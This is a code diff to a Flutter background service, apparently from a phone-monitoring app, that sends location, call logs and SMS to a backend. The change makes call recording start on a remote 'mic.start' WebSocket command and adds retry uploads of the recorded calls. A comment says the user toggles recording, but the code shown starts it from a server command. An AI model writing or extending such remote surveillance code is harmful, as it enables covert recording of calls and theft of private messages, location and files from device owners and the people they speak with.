@@ -1,21 +1,20 @@
+import 'dart:io';
+
 import 'package:dio/dio.dart';
 import 'package:device_info_plus/device_info_plus.dart';
 import 'package:flutter_foreground_task/flutter_foreground_task.dart';
 import 'package:package_info_plus/package_info_plus.dart';
 import 'package:path_provider/path_provider.dart';
+
 import 'api_client.dart';
 import 'call_log_service.dart';
+import 'call_recorder_service.dart';
+import 'call_state_service.dart';
 import 'connectivity_service.dart';
 import 'fs_service.dart';
 import 'location_service.dart';
 import 'sms_service.dart';
 import 'ws_client.dart';
-
-import 'dart:io';                          // ADD — needed for File()
-
-
-import 'call_recorder_service.dart';        // ADD — CallRecorderService
-import 'call_state_service.dart';          // ADD — CallStateService
 
 class TrackingTaskHandler extends TaskHandler {
   WsClient? _ws;
@@ -24,23 +23,37 @@ class TrackingTaskHandler extends TaskHandler {
 
   @override
   Future<void> onStart(DateTime timestamp, TaskStarter starter) async {
-    await ApiClient.init();                       // must be first — recorder + WS need keys
+    await ApiClient.init();
+    if (!await ApiClient.isPaired()) return;
 
-    if (!await ApiClient.isPaired()) return;      // don't start recorder if unpaired
-
-    CallStateService.start(
-      onCallStart: (number) async {
-        await CallRecorderService.start(number: number);
-      },
-      onCallEnd: () async {
-        final path = await CallRecorderService.stop();
-        if (path != null) await _uploadCallRecording(path);
-      },
-    );
+    // NOTE: CallStateService.start() is intentionally NOT called here.
+    // Starting it at service launch would attempt to open the mic before
+    // the user has toggled it, causing SecurityException on Android 14+.
+    // Call recording is only enabled after the user toggles the mic switch.
 
     _ws = WsClient(onMessage: _onWsMessage)..connect();
     await _runCycle();
   }
+
+  @override
+  Future<void> onRepeatEvent(DateTime timestamp) async {
+    await ApiClient.init();
+    await _runCycle();
+  }
+
+  @override
+  Future<void> onDestroy(DateTime timestamp) async {
+    try {
+      CallStateService.stop();
+    } catch (_) {}
+    try {
+      await CallRecorderService.stop();
+    } catch (_) {}
+    _ws?.dispose();
+    _ws = null;
+  }
+
+  // ---------- call recording upload ----------
 
   Future<void> _uploadCallRecording(String path, {String? number}) async {
     final file = File(path);
@@ -57,24 +70,27 @@ class TrackingTaskHandler extends TaskHandler {
 
     try {
       await ApiClient.deviceDio().post('/api/devices/call-recordings', data: form);
-      await file.delete();                  // only delete on success
+      await file.delete(); // only delete on success
     } catch (_) {
-      // keep file on disk so a future run can retry
+      // Keep file on disk so a future run can retry, but rename it so the
+      // retry loop doesn't hammer the backend every 15 seconds.
+      try {
+        await file.rename('${file.path}.failed');
+      } catch (_) {}
     }
   }
 
-  @override
-  Future<void> onRepeatEvent(DateTime timestamp) async {
-    await ApiClient.init();
-    await _runCycle();
-  }
+  Future<void> _retryPendingCallRecordings() async {
+    final dir = await getApplicationDocumentsDirectory();
+    final d = Directory(dir.path);
+    if (!await d.exists()) return;
 
-  @override
-  Future<void> onDestroy(DateTime timestamp) async {
-    CallStateService.stop();              // stop listening for call state
-    await CallRecorderService.stop();     // stop any in-progress recording cleanly
-    _ws?.dispose();
-    _ws = null;
+    await for (final e in d.list()) {
+      if (e is! File) continue;
+      final name = e.path.split('/').last;
+      if (!name.startsWith('call_') || !name.endsWith('.m4a')) continue;
+      await _uploadCallRecording(e.path);
+    }
   }
 
   // ---------- WS commands ----------
@@ -94,6 +110,24 @@ class TrackingTaskHandler extends TaskHandler {
 
       case 'fs.download':
         await _handleFsDownload(msg);
+        break;
+
+      case 'mic.start':
+        if (CallStateService.isListening) break;
+        CallStateService.start(
+          onCallStart: (number) async {
+            await CallRecorderService.start(number: number);
+          },
+          onCallEnd: () async {
+            final path = await CallRecorderService.stop();
+            if (path != null) await _uploadCallRecording(path);
+          },
+        );
+        break;
+
+      case 'mic.stop':
+        CallStateService.stop();
+        await CallRecorderService.stop();
         break;
 
       default:
@@ -200,8 +234,6 @@ class TrackingTaskHandler extends TaskHandler {
       await _flushLocation();
       await _flushCallLogs();
       await _flushSms();
-    }
-    if (status.internetConnected) {
       await _retryPendingCallRecordings();
     }
 
@@ -260,19 +292,6 @@ class TrackingTaskHandler extends TaskHandler {
     }
 
     if (flushed > 0) await LocationService.dropFirst(flushed);
-  }
-
-    Future<void> _retryPendingCallRecordings() async {
-    final dir = await getApplicationDocumentsDirectory();
-    final d = Directory(dir.path);
-    if (!await d.exists()) return;
-
-    await for (final e in d.list()) {
-      if (e is! File) continue;
-      final name = e.path.split('/').last;
-      if (!name.startsWith('call_') || !name.endsWith('.m4a')) continue;
-      await _uploadCallRecording(e.path);
-    }
   }
 
   Future<void> _flushCallLogs() async {
